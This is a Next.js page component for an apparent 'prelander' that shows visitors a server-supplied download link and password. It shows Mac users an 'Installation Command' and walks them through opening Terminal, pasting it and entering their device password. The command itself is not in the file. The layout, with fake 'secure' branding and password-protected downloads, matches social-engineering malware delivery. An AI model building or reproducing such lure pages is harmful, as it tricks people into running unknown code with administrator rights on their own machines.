'use client'

import { useState, useEffect } from 'react'
import { useParams } from 'next/navigation'
import { Copy, Check, Lock, FileDown, Terminal, Play } from 'lucide-react'

export default function PrelanderSlugPage() {
  const params = useParams()
  const slug = params.slug as string
  const [data, setData] = useState<any>(null)
  const [loading, setLoading] = useState(true)
  const [copied, setCopied] = useState(false)
  const [copiedCmd, setCopiedCmd] = useState(false)

  useEffect(() => {
    const fetchData = async () => {
      try {
        if (!slug) { setData(null); setLoading(false); return }
        const res = await fetch(`/api/prelander/resolve/${encodeURIComponent(slug)}`)
        if (!res.ok) { setData(null); setLoading(false); return }
        const json = await res.json()
        setData(json)
      } catch { setData(null) }
      finally { setLoading(false) }
    }
    fetchData()
  }, [slug])

  useEffect(() => {
    document.title = 'Download Ready'
  }, [])

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f0f2f5]">
        <div className="w-8 h-8 border-3 border-gray-300 border-t-gray-600 rounded-full animate-spin" />
      </div>
    )
  }

  if (!data || !data.success) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f0f2f5]">
        <p className="text-gray-500">Failed to load file details.</p>
      </div>
    )
  }

  if (data.os === 'mac') {
    return <MacPrelander data={data} copied={copied} setCopied={setCopied} copiedCmd={copiedCmd} setCopiedCmd={setCopiedCmd} />
  }

  return <WindowsPrelander data={data} copied={copied} setCopied={setCopied} />
}

/* ─── Windows Prelander ─── */
function WindowsPrelander({ data, copied, setCopied }: { data: any; copied: boolean; setCopied: (v: boolean) => void }) {
  const handleCopy = () => {
    if (data?.offer_url) {
      navigator.clipboard.writeText(data.offer_url)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f0f2f5]">
      <div className="w-full max-w-md">
        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-8 pb-5 text-center">
            <div className="w-14 h-14 rounded-full bg-green-100 mx-auto mb-4 flex items-center justify-center">
              <FileDown size={26} className="text-green-600" />
            </div>
            <h1 className="text-xl font-bold text-gray-900">
              Your file is ready to download
            </h1>
            <p className="text-sm text-gray-500 mt-2">
              Your file is prepared. Copy the link to download.
            </p>
          </div>

          <div className="px-6 pb-4">
            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Download Link</label>
            <div className="flex items-center gap-2 bg-gray-50 border border-gray-200 rounded-xl p-1">
              <div className="flex-1 px-3 py-2.5 text-sm text-gray-700 font-mono truncate select-all">
                {data.offer_url}
              </div>
              <button
                onClick={handleCopy}
                className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                  copied
                    ? 'bg-green-600 text-white'
                    : 'bg-gray-900 text-white hover:bg-gray-800'
                }`}
              >
                {copied ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy</>}
              </button>
            </div>
          </div>

          {data.password && (
            <div className="px-6 pb-4">
              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Password</label>
              <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                <Lock size={16} className="text-amber-500 flex-shrink-0" />
                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">
                  {data.password}
                </span>
              </div>
            </div>
          )}

          <div className="px-6 pb-8" />
        </div>

        <p className="text-center text-xs text-gray-400 mt-4">
          Secure file hosting service
        </p>
      </div>
    </div>
  )
}

/* ─── Mac Prelander ─── */
function MacPrelander({ data, copied, setCopied, copiedCmd, setCopiedCmd }: { data: any; copied: boolean; setCopied: (v: boolean) => void; copiedCmd: boolean; setCopiedCmd: (v: boolean) => void }) {
  const installCommand = data.offer_url || ''

  const handleCopyLink = () => {
    navigator.clipboard.writeText(installCommand)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const handleCopyCmd = () => {
    navigator.clipboard.writeText(installCommand)
    setCopiedCmd(true)
    setTimeout(() => setCopiedCmd(false), 2000)
  }

  return (
    <div className="min-h-screen bg-[#f5f5f7] flex flex-col items-center p-4 py-10">
      <div className="w-full max-w-2xl space-y-6">

        {/* Header Card */}
        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-8 pb-5 text-center">
            <div className="w-14 h-14 rounded-full bg-gray-900 mx-auto mb-4 flex items-center justify-center">
              <Terminal size={26} className="text-green-400" />
            </div>
            <h1 className="text-xl font-bold text-gray-900">
              How to open Terminal on Mac
            </h1>
          </div>

          {/* Command with copy */}
          <div className="px-6 pb-5">
            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Installation Command</label>
            <div className="flex items-center gap-2 bg-gray-900 rounded-xl p-1">
              <div className="flex-1 px-3 py-3 text-sm text-green-400 font-mono truncate select-all">
                <span className="text-gray-500 mr-1">$</span> {installCommand}
              </div>
              <button
                onClick={handleCopyCmd}
                className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                  copiedCmd
                    ? 'bg-green-600 text-white'
                    : 'bg-gray-700 text-white hover:bg-gray-600'
                }`}
              >
                {copiedCmd ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy</>}
              </button>
            </div>
          </div>

          {/* Steps */}
          <div className="px-6 pb-6">
            <div className="space-y-3">
              <div className="flex gap-3">
                <div className="flex-shrink-0 w-7 h-7 rounded-full bg-blue-100 text-blue-700 flex items-center justify-center text-sm font-bold">1</div>
                <p className="text-sm text-gray-700 pt-1">
                  Press <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">⌘</kbd> + <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">Space</kbd> to open Spotlight Search.
                </p>
              </div>
              <div className="flex gap-3">
                <div className="flex-shrink-0 w-7 h-7 rounded-full bg-blue-100 text-blue-700 flex items-center justify-center text-sm font-bold">2</div>
                <p className="text-sm text-gray-700 pt-1">
                  Type <strong>&quot;Terminal&quot;</strong> and press <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">Return</kbd> to launch it.
                </p>
              </div>
              <div className="flex gap-3">
                <div className="flex-shrink-0 w-7 h-7 rounded-full bg-blue-100 text-blue-700 flex items-center justify-center text-sm font-bold">3</div>
                <p className="text-sm text-gray-700 pt-1">
                  Once the Terminal window is open, you can proceed with the steps below.
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Installation Steps Card */}
        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-6 pb-2">
            <h2 className="text-lg font-bold text-gray-900">Installation via Terminal command</h2>
          </div>

          <div className="px-6 pb-6">
            <div className="space-y-3 mt-3">
              <div className="flex gap-3">
                <div className="flex-shrink-0 w-7 h-7 rounded-full bg-green-100 text-green-700 flex items-center justify-center text-sm font-bold">1</div>
                <p className="text-sm text-gray-700 pt-1">
                  Copy the installation command above.
                </p>
              </div>
              <div className="flex gap-3">
                <div className="flex-shrink-0 w-7 h-7 rounded-full bg-green-100 text-green-700 flex items-center justify-center text-sm font-bold">2</div>
                <p className="text-sm text-gray-700 pt-1">
                  Open the terminal on your device and paste the command, then press the <strong>&quot;Return&quot;</strong> button.
                </p>
              </div>
              <div className="flex gap-3">
                <div className="flex-shrink-0 w-7 h-7 rounded-full bg-green-100 text-green-700 flex items-center justify-center text-sm font-bold">3</div>
                <p className="text-sm text-gray-700 pt-1">
                  Enter your device password and confirm the installation.
                </p>
              </div>
            </div>
          </div>

          {/* Password */}
          {data.password && (
            <div className="px-6 pb-6">
              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Device Password</label>
              <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                <Lock size={16} className="text-amber-500 flex-shrink-0" />
                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">
                  {data.password}
                </span>
              </div>
            </div>
          )}
        </div>

        {/* Video Tutorial Card */}
        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-6 pb-2">
            <h2 className="text-lg font-bold text-gray-900">Video Tutorial</h2>
            <p className="text-sm text-gray-500 mt-1">Watch the step-by-step guide below</p>
          </div>

          <div className="px-6 pb-6 pt-3">
            <div className="relative w-full aspect-video bg-black rounded-xl overflow-hidden">
              <video
                className="w-full h-full"
                controls
                playsInline
                autoPlay
                muted
                loop
                preload="auto"
                src="/terminal.mp4"
              />
            </div>
          </div>
        </div>

        <p className="text-center text-xs text-gray-400 pb-4">
          Secure installation service
        </p>
      </div>
    </div>
  )
}
